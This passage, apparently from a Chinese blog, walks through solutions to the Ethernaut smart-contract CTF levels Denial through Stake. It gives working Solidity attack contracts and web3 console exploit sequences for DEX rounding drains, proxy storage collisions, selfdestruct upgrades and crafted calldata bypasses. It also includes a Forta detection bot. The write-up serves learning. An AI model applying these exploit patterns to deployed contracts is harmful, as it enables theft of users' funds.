<p>其实就是在 receive/fallback 里写一个死循环将 gas 耗尽, 这样后续调用
transfer 转账的时候就会 revert</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line">    uint256 counter = 0;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        while (true) &#123;</span><br><span class="line">            counter ++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setWithdrawPartner</span>(<span class="string">&#x27;0x&quot;evil_contract_addr&quot;&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="shop">21 Shop</h2>
<blockquote>
<p>漏洞类型：</p>
</blockquote>
<blockquote>
<p>take-away msg:合约调用的非原子性？</p>
</blockquote>
<p>本题针对 view 函数的缺陷进行了攻击，跟 Elevator
那题的思路很像，都是在 victim 合约在调用外部 evil
合约函数时，自身状态变量的更新前没有合理约束条件导致的，攻击流程如下：</p>
<ol type="1">
<li><p>当 MyBuyer 合约调用 shop.buy() 时，Shop 合约会调用 MyBuyer 的
price 函数。</p></li>
<li><p>在 price 函数被调用时，shop.isSold() 仍然是 false，因此返回
101。</p></li>
<li><p>Shop 合约检查 price 返回的值为 101，满足条件，于是设置 isSold 为
true，并更新 price 为 101。</p></li>
<li><p>然后 Shop 再次调用 price 函数为状态变量 price 赋值，此时
shop.isSold() 已经是 true，所以返回 99。因为 isSold 已经更新为
true，Shop 合约不会再次进行检查或更新。</p></li>
</ol>
<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Buyer &#123;</span><br><span class="line">    function price() external view returns (uint256);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// contract Shop 粘贴过来</span><br><span class="line"></span><br><span class="line">contract MyBuyer is Buyer &#123;</span><br><span class="line">    Shop shop;</span><br><span class="line"></span><br><span class="line">    constructor(address addr) &#123;</span><br><span class="line">        shop = Shop(addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function price() external view returns (uint256) &#123;</span><br><span class="line">        if (shop.isSold() == false) &#123;</span><br><span class="line">            return 101;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return 99;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function buy() external &#123;</span><br><span class="line">        shop.buy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="dex">22 Dex</h2>
<blockquote>
<p>漏洞类型：精度缺失</p>
</blockquote>
<blockquote>
<p>take-away msg:solidity不支持原生浮点数，DEX</p>
</blockquote>
<p>这道题背后考察的是 dex
的原理，但由于浮点数处理异常，每次交换时用户希望交换的数目可能小于实际交换的数目，因此来回倒几笔钱，我们就可以多拿到本来不属于我们的钱（？</p>
<p>dex 的基本原理是将一对代币加入流动池以提供流动性,
这样就可以实现两种代币之间的交换,
交换的价格是根据流动池内代币的比例动态计算的</p>
<p>对于这道题来说, 流动池内一对代币 X 和 Y
之间的汇率与这两种代币在流动池内的总量成反比</p>
<p>比如池子里有 100 X 和 10 Y, 那么汇率就是 1 Y = 10 X</p>
<p>如果流动池内代币 X 的总量增大, 那么 X 相对于 Y 在贬值, 即每个 X
能兑换的 Y 会变少</p>
<p>相反, 如果 X 的总量减少, 那么 X 相对于 Y 在升值, 即每个 X 能兑换的 Y
会变多</p>
<p>题目不能够手动修改 token1 或 token2 的地址</p>
<p>然后虽然 addLiquidity 函数被限制了 onlyOwner,
但实际上仍然可以通过手动调用 token1/token2 合约的方式来强制添加流动性,
不过这个点具体怎么利用目前还没怎么想到</p>
<p>getSwapPrice 用于动态计算用代币 from 兑换 to 时的价格，但 Solidity
没有浮点数, 整数之间相除得到的结果会被去整, 即丢掉后面的小数位数。</p>
<p>当用户在 token1 和 token2 之间来回兑换时,
可以看到每次能拿到的代币数量其实是在变多的, 这样多倒几次最终就能将 dex
池内某一类型的代币搬空</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let token1 = await contract.token1();</span><br><span class="line">let token2 = await contract.token2();</span><br><span class="line"></span><br><span class="line">await contract.approve(instance, 1000);</span><br><span class="line"></span><br><span class="line">await contract.swap(token1, token2, 10);</span><br><span class="line">await contract.swap(token2, token1, 20);</span><br><span class="line">await contract.swap(token1, token2, 24);</span><br><span class="line">await contract.swap(token2, token1, 30);</span><br><span class="line">await contract.swap(token1, token2, 41);</span><br><span class="line"></span><br><span class="line">// swap with 45 token2 because 65 * 110 / 45 = 158 &gt; 110 and 46 * 110 / 45 = 110</span><br><span class="line">await contract.swap(token2, token1, 45);</span><br><span class="line"></span><br><span class="line">// should return 0</span><br><span class="line">(await contract.balanceOf(token1, instance)).toString();</span><br></pre></td></tr></table></figure>
<h2 id="dex-two">23 DEX TWO</h2>
<blockquote>
<p>漏洞类型：精度缺失</p>
</blockquote>
<blockquote>
<p>twm(take-away msg)：同上</p>
</blockquote>
<p>这题与 Dex 的区别在于 swap 函数没有了对 from 和 to 代币地址的限制,
这表示我们可以利用自己发行的代币与 dex 内的 token1/token2 交换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Token3 is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">    constructor() ERC20(&quot;Token3&quot;, &quot;Token3&quot;) &#123; &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address account, uint256 value) external &#123;</span><br><span class="line">        _mint(account, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function burn(address account, uint256 value) external &#123;</span><br><span class="line">        _burn(account, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> token1 = <span class="keyword">await</span> contract.<span class="title function_">token1</span>();</span><br><span class="line"><span class="keyword">let</span> token2 = <span class="keyword">await</span> contract.<span class="title function_">token2</span>();</span><br><span class="line"><span class="keyword">let</span> token3 = <span class="string">&#x27;Token Contract Addr&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// token3.mint(player, 2);</span></span><br><span class="line"><span class="comment">// token3.mint(instance, 1);</span></span><br><span class="line"><span class="comment">// token3.approve(instance, 1000);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// approve token1 and token2</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">approve</span>(instance, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// swap all token1</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token3, token1, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// check token1 balance in contract</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(token1, instance)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// token3.burn(instane, 1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// swap all token2</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token3, token2, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// check token2 balance in contract</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balanceOf</span>(token2, instance)).<span class="title function_">toString</span>();</span><br><span class="line"><span class="comment">// 这里会发现 token2 并不是 0，而是 50。这是因为我们灌进去的 token3 贬值了</span></span><br><span class="line"><span class="comment">// 所以我们需要用更多的 token3 把 token2 换出来</span></span><br><span class="line"><span class="comment">// 我当时没算好，所以 swap(token2,token3,3) 之后又 swap(token2,token3,7)</span></span><br><span class="line"><span class="comment">// 总共是用我的 10 个 token2 换了 instance 的 0 个 token3 出来</span></span><br><span class="line"><span class="comment">// 用下面这行应该也能达标</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token2, token3, <span class="number">10</span>);</span><br><span class="line"><span class="comment">// 这样 instance 里 token2 : token3 = 60 : 3 = 20 : 1</span></span><br><span class="line"><span class="comment">// 我们只需要用 3 个 token3 就可以换出 instance 里 剩下的 60 个 token2 了</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -&gt; remix 里 token3.mint(player, 3);</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">swap</span>(token3, token2, <span class="number">3</span>);</span><br></pre></td></tr></table></figure>
<p>做完这道题我才理解代币到底是干啥的...比如说有很值钱的 token1 与
token2，在 dex 交换时没有检测好币类，让非法币混入了池里，token1/2 就会被
token3 大量替代</p>
<p>同样，如果没有做好浮点数约束，也会造成资金的损失..</p>
<p>链子还是蛮有意思的 :D</p>
<h2 id="puzzle-wallet">24 Puzzle Wallet</h2>
<blockquote>
<p>漏洞类型：代理合约slot冲突</p>
</blockquote>
<blockquote>
<p>twm：代理合约存储槽冲突</p>
</blockquote>
<p>这代码好长..这之后的题做的都懵懵的，之后对合约有一定的了解之后再回过头来看吧。</p>
<p>exp:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// invoke PuzzleProxy.proposeNewAdmin() to change `owner` in PuzzleWallet</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&#x27;a63767460000000000000000000000009a80a78bebE92EF9cDfC4CA116fC4925237fDbd0&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// add player to whitelist</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">addToWhitelist</span>(player);</span><br><span class="line"></span><br><span class="line"><span class="comment">// multicall calldata</span></span><br><span class="line"><span class="keyword">let</span> multicall = <span class="string">&#x27;ac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000a4ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a4ac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// invoke multicall x2, and each multicall will invoke deposit</span></span><br><span class="line"><span class="comment">// msg.value will be used twice (add 0.002 eth), but we only need to send it once (0.001 eth)</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: multicall, <span class="attr">value</span>: <span class="title function_">toWei</span>(<span class="string">&#x27;0.001&#x27;</span>)&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check balance of player, should be 0.002 eth</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balances</span>(player)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// transfer contract balance to player</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">execute</span>(player, <span class="title function_">toWei</span>(<span class="string">&#x27;0.002&#x27;</span>), <span class="string">&#x27;0x0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check balance of contract, shoule be zero</span></span><br><span class="line">(<span class="keyword">await</span> contract.<span class="title function_">balances</span>(instance)).<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// change `admin` in PuzzleProxy</span></span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">setMaxBalance</span>(player);</span><br></pre></td></tr></table></figure>
<h2 id="motorbike">25 Motorbike</h2>
<blockquote>
<p>漏洞类型：代理合约context错误</p>
</blockquote>
<blockquote>
<p>twm：利用代理合约上下文绕过限制</p>
</blockquote>
<p>这道题使用了 ERC1967 ，ERC1967
提供了一种不改变合约地址而升级合约的标准方式。而在 ERC1967
中牵扯到了两种合约：代理合约与逻辑合约。</p>
<p>代理合约的作用是保持合约地址不变，同时通过更新 _IMPLEMENTATION_SLOT
中的地址来改变其指向的逻辑合约，实现合约的升级。在本题中，Motorbike
是代理合约（proxy contract），它在 constructor
函数中设置了逻辑合约的地址，并将逻辑合约初始化；还在 fallback
函数中捕获所有与合约接口不匹配的调用，并移交给 logic 合约去处理。而
engine 是逻辑合约（implementation/logic contract）。</p>
<p>以上是基础知识，我们来看一下这道题该怎么做。</p>
<p>首先，题目要求我们 selfdestruct 掉 engine 这个合约，而 engine
合约中并没有 selfdestruct 这个函数。但通过阅读代码我们可以看到，engine
合约在 _upgradeToAndCall 函数中调用了 “升级后的合约地址的 data
这一函数选择器代表的函数”，如果我们可以把升级后的合约地址指向我们的恶意合约
evil，然后在 evil 中设置 selfdestruct，那么就可以达成我们的目的了。</p>
<p>但题目还设置了一条防线：调用 upgradeToAndCall 的用户必须是
upgrader，而 motorbike 在实例化的时候就已经调用过一次 initialize 了，而
initializer 这个modifier
限定了这个初始化函数只能被调用一次。看起来我们没有办法改变
upgrader了。</p>
<p>但实际上，proxy contract的上下文中，initialize
函数确实已经被调用过了，但在 engine 这个 logic contract
的上下文中并没有被调用过。因此我们可以直接找到 engine
的合约地址，然后主动调用 initialize 函数。</p>
<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Engine &#123;</span><br><span class="line">    function initialize() external;</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack &#123;</span><br><span class="line">    Engine private engine;</span><br><span class="line"></span><br><span class="line">    constructor(address target) &#123;</span><br><span class="line">        engine = Engine(target);</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    function hack() external &#123;</span><br><span class="line">        engine.initialize();</span><br><span class="line">        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function destruct() external &#123;</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但这道题貌似现在出了些认证问题，我们可以在<a
href="https://sepolia.etherscan.io/address/0x5f32626248fc2a2af86c775bfd9a2e7b8b2f2a4d#internaltx">etherscan</a>上看到这个合于确实调用了自毁函数，但好像没有执行自会，因此仍然提交不通过..</p>
<h2 id="doubleentrypoint">26 DoubleEntryPoint</h2>
<p>这道题的主要合约为 DoubleEntryPoint（简称DEP），该合约持有 DET
这种代币，同时设计了 CryptoVault 这个合约用来管理 DET 代币，在
CryptoVault 中用户可以清理走合约中的非 underlying 代币（underlying
代币也是合约自定义的，是用来维护合约的、不可清理的代币）。而本题目想让我们利用<code>Forta</code>来监控
DEP 的行为，防止 underlying 代币被清理，从而导致合约不可用。</p>
<p>当我们调用 sweepToken(LGT_address) 时，sweepToken 会调用
LegacyToken.transfer，</p>
<p>而此时 LegacyToken.delegate 已经被设置为了 DEP 合约的实例地址，因此
LegacyToken.transfer 会调用 DEP.delegateTransfer(sweptTokensRecipient,
token.balanceOf(CryptoVault.address), CryptoVault.address)，</p>
<p>此时如果 CryptoVault 中存在
DET，就会被全数转走。这是一个典型的“代币双重入口”漏洞，即通过操纵一个代币的转账逻辑间接影响另一个代币的行为。</p>
<p>防御起来也很简单，只要让 DEP 中的 delegateTransfer 的 origSender
不要是 CryptoVault 就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface IDetectionBot &#123;</span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface IForta &#123;</span><br><span class="line">    function setDetectionBot(address detectionBotAddress) external;</span><br><span class="line">    function notify(address user, bytes calldata msgData) external;</span><br><span class="line">    function raiseAlert(address user) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AlertBot is IDetectionBot &#123;</span><br><span class="line">    address private cryptoVault;</span><br><span class="line">    IForta iforta;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        cryptoVault = 0xe0B40efa39E4B61a9141AFbe95B54a113A1000CE;</span><br><span class="line">        iforta = IForta(0xb76adbE51242C49306D9C9EB929F8f3E508c5f82);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function handleTransaction(address user, bytes calldata msgData) external override &#123;</span><br><span class="line">        address origSender;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            origSender := calldataload(0xa8)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if(origSender == cryptoVault) &#123;</span><br><span class="line">            IForta(msg.sender).raiseAlert(user);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="good-samaritan">27 Good Samaritan</h2>
<p>这个合约是一个“好心的 Samaritan 人”(简称 S人)模板，这个
S人有一个钱包和一种代币，并且初始就有一百万个币。并且如果你问他要10个币，他会无私的捐款给你；即使他也穷得响叮当了、穷的不多于10个币，S人仍然会把自己剩余的钱捐给你。</p>
<p>现在我们是恶意用户，想要诈骗S人这一百万个币，但如果通过donate10来诈骗，需要调用十万次requestDonation，因此我们需要想一个走
catch 途径的方式。</p>
<p>只需要实现 INotifyable 接口, 然后在 amount 等于 10 的时候 revert
NotEnoughBalance error, 这样 GoodSamaritan 就会再触发一次转账,
将钱包内所有的钱转走。</p>
<p>exp如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line"></span><br><span class="line">error NotEnoughBalance();</span><br><span class="line"></span><br><span class="line">interface INotifyable &#123;</span><br><span class="line">    function notify(uint256 amount) external; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">interface GoodSamaritan &#123;</span><br><span class="line">    function requestDonation() external returns (bool enoughBalance);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack is INotifyable &#123;</span><br><span class="line">    address target = 0xed5Ad44F9274b4be60e2c017FB72be94a8D1857D;</span><br><span class="line">    GoodSamaritan gs;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        gs = GoodSamaritan(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() external &#123;</span><br><span class="line">        gs.requestDonation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function notify(uint256 amount) pure external &#123;</span><br><span class="line">        if(amount == 10) &#123;</span><br><span class="line">            revert NotEnoughBalance();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="gatekeeper-three">28 GateKeeper Three</h2>
<p>首先我们发现这个构造函数 construct0r
居然写错了，并且还用的public，所以我们写个 evilContract 调用一下
construct0r 就能将 owner 设置成 evilContract 的地址。</p>
<p>GateOne 要求调用者是 owner，但源头不是owner。很简单，我们通过
evilContract 操作即可。</p>
<p>GateTwo 要求 allowEntrance 为 true。只要 createTrick 与 getAllowance
在同一次 function（交易） 内执行，block.timestamp 就是一样的。</p>
<p>GateThree 要求该合约超过 0.001 ether，并且发给 evilContract 0.001
ether 失败。</p>
<p>exp 如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface GatekeeperThree &#123;</span><br><span class="line">    function construct0r() external;</span><br><span class="line">    function createTrick() external;</span><br><span class="line">    function getAllowance(uint256 _password) external;</span><br><span class="line">    function enter() external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract evilContract &#123;</span><br><span class="line">    address target = 0x85bBddCADB43AB650d91eb9658681aD70c721407;</span><br><span class="line">    GatekeeperThree victim;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        victim = GatekeeperThree(target);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hack() payable external &#123;</span><br><span class="line">        require(msg.value &gt; 0.001 ether);</span><br><span class="line">        // gateOne</span><br><span class="line">        victim.construct0r();</span><br><span class="line"></span><br><span class="line">        // gateTwo</span><br><span class="line">        victim.createTrick();</span><br><span class="line">        victim.getAllowance(block.timestamp);</span><br><span class="line"></span><br><span class="line">        // gateThree</span><br><span class="line">        payable(address(victim)).transfer(msg.value);</span><br><span class="line">        </span><br><span class="line">        // hack</span><br><span class="line">        victim.enter();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        revert();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="switch">29 Switch</h2>
<p>这道题要求我们掌握 CALLDATA 是如何编码的。所以我们先来恶补一下
calldata 的知识。</p>
<p>当合约A调用合约B，这条调用信息会被打包成一条交易信息，广播给区块链上的每个节点，并放入这些节点的交易池中；当前一个区块验证/挖掘完毕，所有节点会选择自己池中的一组交易信息，初步验证gas、余额等信息后生成一个候选block，在生成候选区块的同时，节点会启动EVM执行交易；当满足PoW后，节点会广播自己的候选区块让其他人验证；</p>
<p>而合约A调用B时，A会构建 CALLDATA，而B则通过 CALLDATA 来判断 A
调用了自己的哪一个 function。</p>
<p>现在我们已经了解了 CALLDATA
的应用场景，接下来我们看一下它长什么样子（编码方式）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xbabecafe  -&gt;  (keccak(function))[:4]</span><br><span class="line">00000000 00000000 00000000 00000000 00000000 00000000 00000000 00000000  -&gt;  其他数据</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>上面是一个例子，CALLDATA
由四字节的函数签名和数据组成，具体怎么编码可以看<a
href="https://cylab.be/blog/334/solidity-abi-encoding-explained">这篇</a></p>
<p>回到这道题，我们肯定是需要调用 <code>turnSwitchOn</code>
来打开开关，但是这个函数限定了
onlythis，也就是说我们需要让目标合约自己调用 turnSwitchOn</p>
<p>可以看到 <code>flipSwitch</code> 有自己调用自己的 call
命令，但是需要绕过一些 modifier</p>
<p>首先我们来看一下这几个函数的签名：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;turnSwitchOff()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x20606e15b70f0894e0e83ae9593ae406a94abb5adcfcf0d169c6784f02198dc3&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;turnSwitchOn()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x76227e12b0f9524a1cdf8423a63057ea998f18f618846d452f0caf8339009449&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;flipSwitch(bytes)&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x30c13adec91872243f797e6f9ca682ad108854e1f771ca6bee08c6550c7198d7&#x27;</span></span><br></pre></td></tr></table></figure>
<p>我们希望调用 <code>flipSwitch</code>
函数，因此我们会先在头部四字节写下<code>0x30c13ade</code>，然后因为
bytes 是动态变量，因此我们会用 32 字节来记录 offset，32字节记录
length，然后是实际 data</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30c13ade</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000020 &lt;- offset</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000length &lt;- length</span><br><span class="line">xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx &lt;- 实际 data</span><br></pre></td></tr></table></figure>
<p>接着我们希望调用 <code>turnSwitchOn</code> 函数，所以实际 data
处我们希望是 turnSwitchOn 的标识符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30c13ade</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000020 &lt;- offset</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000004 &lt;- length </span><br><span class="line">76227e1200000000000000000000000000000000000000000000000000000000 &lt;- 实际 data</span><br></pre></td></tr></table></figure>
<p>但 filpSwtich 被 onlyOff
修饰了，我们需要绕过这个修饰符。而这个修饰符中使用
calldatacopy(t,s,f)，将 offset = s 处的 f 个字节拷贝到 t 地址处。而
<code>calldatacopy(selector, 68, 4)</code> 正好是我们现在 76227e12
的位置，我们需要在这写下 keccak256("turnSwitchOff()") 也就是
20606e15</p>
<p>之后，我们修改一下offset就能改变data的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x30c13ade</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000060 &lt;- offset</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000000 &lt;- padding </span><br><span class="line">20606e1500000000000000000000000000000000000000000000000000000000 &lt;- bypass</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000004 &lt;- length</span><br><span class="line">76227e1200000000000000000000000000000000000000000000000000000000 &lt;- 实际 data</span><br></pre></td></tr></table></figure>
<p>exp如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="higherorder">30 HigherOrder</h2>
<p>跟上一题差不多，也是 calldata 可以被我们人为操控进而达成一些目的</p>
<p>soliditylang 上两个 Yul 函数的介绍</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sstore(p, v)     storage[p] := v</span><br><span class="line">calldataload(p)  从位置p开始的调用数据（32字节）</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;registerTreasury(uint8)&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x211c85abbbaf9884d77268c011d56de0d4b5e816ac06c84275c1aadd7eab81c5&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">keccak256</span>(<span class="string">&quot;claimLeadership()&quot;</span>)</span><br><span class="line"><span class="string">&#x27;0x5b3e8fe738d49181e7fc102771232e813fa1ae1daa69c894601a0170e188ff95&#x27;</span></span><br></pre></td></tr></table></figure>
<p>所以我们构造data为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x211c85ab</span><br><span class="line">0000000000000000000000000000000000000000000000000000000000000100</span><br></pre></td></tr></table></figure>
<p>就可以绕过 treasury &gt; 255 的检测了。</p>
<p>然后调用 claimLeadership 就行了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x5b3e8fe7</span><br></pre></td></tr></table></figure>
<p>exp 如下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;0x211c85ab0000000000000000000000000000000000000000000000000000000000000100&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>: player, <span class="attr">to</span>: instance, <span class="attr">data</span>: <span class="string">&quot;0x5b3e8fe7&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>
<h2 id="stake">31 Stake</h2>
<p>本题要求我们：</p>
<ol type="1">
<li>Stake 合约的 ETH 大于 0</li>
<li>totalStaked 需要大于合约的 ETH</li>
<li>我们必须成为 Staker</li>
<li>我们的 staked balance 为 0</li>
</ol>
<p>StakeWETH 中的两个 abi：</p>
<p>0xdd62ed3e = allowance 0x23b872dd = transferFrom</p>
<p>对于第一点，我们可以调用 StakeETH
向合约转账，当然也可以调用自毁函数进行强制转账</p>
